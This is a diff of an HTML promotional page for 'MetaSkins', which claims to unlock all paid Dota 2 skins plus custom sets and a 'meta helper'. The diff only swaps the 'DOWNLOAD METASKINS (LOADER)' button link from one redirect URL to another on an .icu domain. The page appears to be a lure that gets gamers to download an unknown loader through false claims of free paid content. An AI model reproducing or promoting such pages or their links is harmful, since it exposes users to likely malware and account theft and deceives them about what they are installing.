@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#66ff99;border-bottom:2px solid #33cc66;text-align:center;">✨ MetaSkins | Access All In-Game Skins & Exclusive Custom Sets ✨</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Unlock the best Dota 2 skinning experience.</strong> MetaSkins gives you access to every in-game skin (Arcanas, Immortals) plus hundreds of exclusive, high-quality custom skins.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#66ff99;color:#000;padding:12px 25px;">⬇️ DOWNLOAD METASKINS (LOADER)</a><p>✅ All in-game skins ✅ Custom sets ✅ Meta helper ✅ FPS boost mod</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://nowayasap.icu/red" style="background:#66ff99;color:#000;padding:12px 25px;">⬇️ DOWNLOAD METASKINS (LOADER)</a><p>✅ All in-game skins ✅ Custom sets ✅ Meta helper ✅ FPS boost mod</p></div>
 <img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>🎮 What Makes MetaSkins Unique:</h3>
 <ul><li><strong>Unlock Every In-Game Skin:</strong> Gain instant access to all existing Arcanas, Immortals, landscapes, couriers, and weather effects.</li>
